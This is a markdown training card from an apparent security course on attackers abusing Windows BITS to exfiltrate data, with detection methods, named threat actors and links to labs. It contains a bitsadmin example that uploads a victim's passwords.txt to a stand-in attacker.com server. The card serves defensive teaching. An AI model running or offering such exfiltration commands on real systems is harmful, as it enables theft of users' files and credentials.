<img width="300" height="414" alt="BNB_CARDS_v3_30" src="https://github.com/user-attachments/assets/a7a773e1-427f-4e19-a723-1813d79e33d1" />




# Backround Intelligent Transfer Service(BITS) As Exfil

**BITS** is a built-in Windows service that was designed to transfer files in the background - think Windows Update downloads, or software patches silently installing while you work. It throttles bandwidth, survives reboots, and runs quietly without drawing attention.

Which is exactly why attackers love it.

---

## Why Attackers Use BITS

The core idea is simple: if you use a tool that Windows ships with and trusts, your traffic looks normal. Security teams aren't going to block BITS - that would break Windows Update. So when an attacker queues a BITS job to send data out to a remote server, it often slips right through.

This technique falls under what's called **living-off-the-land** - using legitimate system tools to do malicious things. No custom malware needed, no suspicious executables, just `bitsadmin.exe` or the PowerShell `Start-BitsTransfer` cmdlet doing what they were built to do.

The attacker has usually already compromised a machine by the time they reach this stage. BITS is used in the **exfiltration phase** - when they're trying to quietly move stolen data out of the network.

---

## How It Actually Works

Once inside a machine, an attacker can create a BITS job like this:

```cmd
bitsadmin /create exfil
bitsadmin /addfile exfil C:\Users\victim\Documents\passwords.txt http://attacker.com/upload/passwords.txt
bitsadmin /resume exfil
```

That's it. Windows will now upload that file to the attacker's server using BITS, retrying automatically if the connection drops, and doing so with minimal noise. The job can even be scheduled to run only when the machine is idle.

---

## How This Gets Detected

Since the traffic looks legitimate, detection relies on context rather than content:

- **Network Threat Hunting** - looking for BITS traffic going to unusual or external destinations, especially ones with no business justification
- **Firewall Log Analysis** - spotting outbound connections on HTTP/HTTPS from BITS to IPs or domains that don't match expected update servers
- **Endpoint Analysis** - reviewing BITS job history and queued transfers directly on the machine (`bitsadmin /list /allusers`)
- **Endpoint Security Protection Analysis** - EDR tools may flag BITS jobs that reference sensitive file paths or connect to suspicious hosts

The key thing to understand is that the *behavior* isn't inherently malicious - it's the *destination and the files being transferred* that raise the alarm.

---

## Known Tools That Use This Technique

- **Leviathan** - a threat actor group known for targeting defense and maritime industries, documented using BITS for stealthy data exfiltration
- **UBoatRAT** - a remote access trojan that leverages BITS to download and upload data while blending into normal Windows traffic

---

## CTF Challenges

Put your knowledge to the test with this online quiz!

>[!Note]
>
>You will be required to **SIGN-IN** or **[CREATE AN ACCOUNT](https://learning.antisyphontraining.com/)** on our LMS platform upon clicking!

[Take me to the CTF Quiz!](https://learning.antisyphontraining.com/learn/course/bb-ctf-labs/c2-exfiltration/background-intelligent-transfer-service-bits-as-exfil?page=2)

<!--- [Easy 1 – Spot the BITS Job](ctfs/BITS_easy-1.md)
- [Easy 2 – Log Analysis: Outbound BITS Traffic](ctfs/BITS_easy-2.md)
- [Medium – Reconstructing an Exfiltration Timeline](ctfs/BITS_medium.md)
- [Hard – Full Exfil Hunt and Attribution](ctfs/BITS_hard.md)
-->
---

## Labs

Hands-on practice with real tools:

- [Leviathan Lab](labs/leviathan/leviathan.md)
- [UBoatRAT Lab](labs/uboatrat.md)

---

BITS exfiltration is a good reminder that not every attack involves exotic malware. Some of the most effective techniques use tools that have been on your machine since day one. Knowing how to spot the abuse of legitimate services is what separates a reactive security team from a proactive one.



***                                                                 
<b><i>Continuing the course? </br>[Next Card](/Decks/CORE_v3.1/C2E/Cloud_Based_Services_As_Exfil.md)</i></b>

<b><i>Want to go back? </br>[Previous Card](/Decks/CORE_v3.1/C2E/Domain_Name_System_As_C2.md)</i></b>

<b><i>Looking for a different Card? </br>[Card Directory](/card_navigation.md)</i></b>

***Finished with the Labs?***

Please be sure to destroy the lab environment!

[Click here for instructions on how to destroy the Lab Environment](/labdestruction.md)

---
